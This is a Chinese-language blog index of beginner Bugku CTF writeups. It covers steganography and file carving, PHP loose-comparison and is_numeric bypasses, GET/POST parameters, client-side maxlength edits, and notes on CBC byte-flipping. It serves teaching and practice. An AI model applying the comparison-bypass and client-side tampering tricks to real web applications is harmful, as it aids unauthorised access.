    <content type="text"><![CDATA[CBC字节翻转攻击原理 CBC模式：Cipher Black Chaining mode (密码分组链接模式)CBC模式进行加解密是都需要一个随机初始向量iv，在第一轮进行加解密是都需要与iv进行xor的。 任何字符与本身xor都是为0，任何字符与0xor都为本身，如A xor A=0，A xor 0=A 加密过程1、将明文分为若干组（16个字节为一组），最后一组不足则用特殊字符填充2、生成一个初始向量iv和key密钥3、用iv与第一组明文异或（iv只影响第一组生成的密文）生成密文4、然后再用前n组密文与后n+1组明文异或生成第n+1组密文，以次重复5、最后将生成的密文拼接起来，就成了最终密文加密公式：Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块 解密过程：1、将密文分组2、用iv与第一组密文xor，解密得到第一组明文3、用第n组密文与第n+1组密文xor，解密得到第n+1组明文，以此类推4、将各组的明文拼接在一起就是最终要得到的明文了 注意一下：解密的时候前一组密文只影响后一组明文的结果，而不会影响其他组明文的结果，由图也可看得出，这个也是进行攻击的重要之处。 有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2： CBC字节翻转攻击原理图http://processon.com/chart_image/5c37fd8de4b0db2e59306630.png123456XOR异或运算异或，英文为exclusive OR，缩写成xor异或的数学符号为“⊕”异或略称为XOR、EOR、EX-OR程序中有三种演算子：XOR、xor、⊕。两个输入相同时为0，不同则为1]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CBC</tag>
        <tag>加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-论剑]]></title>
    <url>%2F2019%2F01%2F20%2F201909%2F</url>
    <content type="text"><![CDATA[论剑-writeup因为很少人做出来，导致网上很少这个wp（找不到），所以我在这里记录下解题思路打开题目访问链接，把图片下载下来另存为先把它丢进kali上binwalk扫描以下，发现有隐藏文件，foremost直接分离出来，得到两张图片把图片都拿去二进制编辑工具查看下，在原图上搜索下FFD9（jpg的结束标识），发现有两个，以及一段二进制文件，很可疑这段二进制拿去转ASCII码，得到mynameiskey!!!hhh 折腾了下，暂时先放着。什么详细信息、备注都毫无hint，想着修改图片高度看下，发现新大陆，但是隐藏了一部分-_-!把分离出来的图片都修改高度，发现跟原图一样，无果天坑，这里想打si作者的环节，在分离出来的两张图片，以及这段这段二进制狂下功夫，xor、盲水印、色道分析..折腾了一段时间并没有什么用查看二进制那段信息发现，看到BC AF 27 1C好熟悉，好像特征码给改过，尝试修改,修复文件头12345678910111213141516171819常见的文件头：7z文件头标识：37 7A BC AF 27 1CJPEG/JPG文件头标识: ff, d8 (SOI) (JPEG 文件标识) 文件结束标识: ff, d9 (EOI) PNG文件头标识：89 50 4E 47 0D 0A 1A 0AGIF文件头标识：47 49 46 38 39(37) 61--- GIF89(7)aBMP文件头标识：42 4D--- BMHTML (html)文件头标识：68746D6C3E ZIP Archive (zip)文件头标识：504B0304 --- PKRAR Archive (rar)文件头标识：52617221 等等.. 丢回kali用binwalk分析，发现多了一个压缩包，分离，注意使用foremost分离不出来，利用dd分离出来123456使用dd命令分离文件，如:dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163if=file（源文件）of=file（输出文件）bs=bytes（一次性转换bytes个字节，及转换缓冲区大小）skip=blocks（输入文件开头跳过blocks个块再开始复制--通俗点讲就是从哪开始） 进行解压，需要密码，用二进制转的ASCII码进行解密，得到一张图片，修改高度，得到另一部分的flag，进行拼接最终得到一个的密文这个不是md5，是一个base16密文，进行base16解密，得到flag]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
        <tag>base16</tag>
        <tag>文件头</tag>
        <tag>ASCII</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-web3]]></title>
    <url>%2F2019%2F01%2F20%2F201904%2F</url>
    <content type="text"><![CDATA[web3-writeup打开题目点击访问链接，无限弹窗好了，我点烦了，粗暴点直接按（Ctrl+u）直接强制查看源码，也可以自己直接使用view-source:URL，查看源码。得到一段Unicode编码，Burp Suite直接解码，也可以在线的工具，百度一下很多的。123Unicode编码：Unicode码扩展自ASCII字元集。Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准，包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-矛盾]]></title>
    <url>%2F2019%2F01%2F20%2F201910%2F</url>
    <content type="text"><![CDATA[矛盾-writeup打开题目访问链接，得到一串代码，又是一道代码审计的题12345678//代码分析$num=$_GET['num']; //Get方式获取参数if(!is_numeric($num)) //is_numeric()函数是否为数字或者数字字符串-&gt;&gt;加个！取反,通俗点讲这里不能为数字&#123;echo $num; //如果不是数字就输出if($num==1) //矛盾吧，上面又不要数字，这里又要是1echo 'flag&#123;**********&#125;'; //如果值为1则输出flag&#125; 根据提示，可以用科学计数法表示1，构造URL：?num=1e0.1 既不是纯数字，其值又等于1 其实还有很多种姿势获取到flag，授人以鱼不如授人以渔。以下讲解几个特征。12345678910php是一个弱类型语言==表示的是等于 ，比较两个变量的值，不比较数据类型。只要数值等于就成立了===表示的是全等，比较的是两个变量的值和类型== 判断时，当数字与字符串比较时，系统先将字符串转化为数字，再与数字进行比较。is_numeric（）函数用于检测变量是否为数字或数字字符串。is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，怎么构造有思路了吗？PHP浅谈==和===：https://blog.csdn.net/auuuuuuuu/article/details/79621635科学计数法：https://baike.baidu.com/item/科学记数法/1612882?fr=aladdin]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-web基础$_POST]]></title>
    <url>%2F2019%2F01%2F19%2F201905%2F</url>
    <content type="text"><![CDATA[web基础$_POST-writeup打开题目，这是一道简单的post题还是老规矩，点击访问链接，提示给出一串代码，分析代码，一道简单的代码审计。1234$what=$_POST['what']; //post提交数据赋值给变量echo $what;if($what=='flag') //判断post提交的数据是否等于flag，如果true输出flagecho 'flag&#123;****&#125;'; 我们只要post提交的变量what=falg就可以了，这里用一款熟悉的插件工具HackBak点击Execute提交，flag就出来了。1POST提交：向指定的资源提交要被处理的数据。 浅析get与post的区别：定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE（查、改、增、删）四个操作。对资源的增，删，改，查操作，其实都可以通过GET/POST完成，不需要用到PUT和DELETE。 GET请求一般不应产生副作用。就是说，它仅仅是获取资源信息，就像数据库查询一样，不会修改，增加数据，不会影响资源的状态。GET请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，参数之间以&amp;相连。 POST把提交的数据则放置在是HTTP包的包体中。POST的安全性要比GET的安全性高。 get是从服务器上获取数据，post是向服务器传送数据。get 和 post只是一种传递数据的方式，get也可以把数据传到服务器，他们的本质都是发送请求和接收结果。只是组织格式和数据量上面有差别，GET和POST只是发送机制不同，并不是一个取一个发！]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-web基础$_GET]]></title>
    <url>%2F2019%2F01%2F19%2F201901%2F</url>
    <content type="text"><![CDATA[web基础$_GET-writeup点击访问链接，分析给出的代码1234$what=$_GET['what']; //Get方式获取参数echo $what; if($what=='flag') //这里有个if判断当what的值等于flag时就输出flagecho 'flag&#123;****&#125;'; 分析完代码，我们直接在URL中，后面直接加上?what=flag，Get请求123Get请求：从指定的资源请求数据。GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接。URL中的?号：分隔实际的URL和参数]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-color]]></title>
    <url>%2F2019%2F01%2F19%2F201903%2F</url>
    <content type="text"><![CDATA[color-writeup打开题目点击链接，得到一个压缩包附件，解压打开，7张png格式的图片，哇!你有见过彩虹吗？利用Stegsolve查看每张图片的最低位，发现有变化，组合起来Make Me Tall根据提示的意思，应该需要改变图片的高度发现图片下方有黑白格子，按照黑格子-&gt;1,白格子-&gt;0，转成二进制123456711111111010111101111111110111111101111110000110010101011000101001010010000001101110100110111010101111001101101101011011000111001101101111101 经过几次尝试后发现，这里每一列(巨坑)，七个数字组成一个字符，进行二进制转化ascii码得到flagpython3脚本：12345678910111213141516# coding:utf-8# Bug_ku color# 七张图片下方的黑白格子转换的二进制color1 = '11111111010111101111'color2 = '11111011111110111111'color3 = '00001100101010110001'color4 = '01001010010000001101'color5 = '11010011011101010111'color6 = '10011011011010110110'color7 = '00111001101101111101'# 循环根据下标组合成每一列的二进制for i in range(0, 20): color = color1[i]+color2[i]+color3[i]+color4[i]+color5[i]+color6[i]+color7[i] print(chr(int(color, 2)), end='') # 打印转换后的ASCII码 PNG文件头知识：1234567（固定）八个字节：89 50 4E 47 0D 0A 1A 0A 代表着PNG文件头（固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13，描述IHDR头部的大小（固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH）（可变）紧接着13位数据块（IHDR) -前四个字节代表该图片的宽（Width） -后四个字节代表该图片的高（Height） -后五个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-计算器]]></title>
    <url>%2F2019%2F01%2F19%2F201908%2F</url>
    <content type="text"><![CDATA[计算器-writeup查看题目，访问题目给出的链接查看是一个随机数字运算的验证码，输入结果值发现最大只能输入一位长度的值点击提交看看有什么结果，并没有什么用！浏览器上按F12,审核元素，查看源代码，发现maxlength=”1”,把maxlength=”1”修改为maxlength=”2”把结果值填上，点击验证得到flag 我发现一个骚姿势就是，只要你够耐心的话一直点击刷新，会有意向不到的结果1234567HTML input maxlength属性定义和用法 maxlength 属性规定 &lt;input&gt; 元素中允许的最大字符数。 语法 &lt;input maxlength="number"&gt; 属性值 number 在&lt;input&gt;元素中允许的最大字符串]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-web2]]></title>
    <url>%2F2019%2F01%2F19%2F201902%2F</url>
    <content type="text"><![CDATA[web2-writeup可能会写的有点啰嗦，但是我不想跟我一样入门的小白看到教程一脸？？？这是一道20分值的简单题，听说聪明的人都能找到答案直接访问链接这是一个满屏滑稽的页面在浏览器当前页面上直接按F12审查元素，查看源代码，查看到flag也可以利用view-source:sURL查看源代码，查看到flag12345F12:开发人员工具，是开发人员调试利器~ view-source:是一种协议，早在基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于windows pack2以及更高的版本后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器还可以使用。 使用方法： view-source:sURL 回车即可看到当前网页的源代码。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[勿忘初心]]></title>
    <url>%2F2019%2F01%2F18%2F2019%2F</url>
    <content type="text"><![CDATA[努力努力再努力Hello,Blog!]]></content>
      <categories>
        <category>勿忘初心</category>
      </categories>
      <tags>
        <tag>努力努力再努力</tag>
        <tag>小维同学</tag>
      </tags>
  </entry>
</search>
